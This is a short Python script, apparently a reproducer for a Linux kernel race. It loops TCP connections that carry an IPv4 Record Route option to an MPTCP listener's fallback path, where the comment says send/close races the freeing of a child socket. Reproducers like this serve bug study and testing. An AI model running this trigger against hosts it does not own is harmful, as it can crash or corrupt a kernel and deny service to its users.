#!/usr/bin/env python3
# Plain TCP client with an IPv4 RR option on the SYN, against the MPTCP
# listener's fallback path (the listener's send/close races the child free).
import socket, sys, time
ip = sys.argv[1]
port = int(sys.argv[2])
dur = float(sys.argv[3]) if len(sys.argv) > 3 else 0.2
rr = bytes([7, 39, 4]) + b"\x00" * 36
end = time.time() + dur
while time.time() < end:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_OPTIONS, rr)
        s.settimeout(2.0)
        s.connect((ip, port))
        while True:
            d = s.recv(65536)
            if not d:
                break
        s.close()
    except OSError:
        time.sleep(0.002)
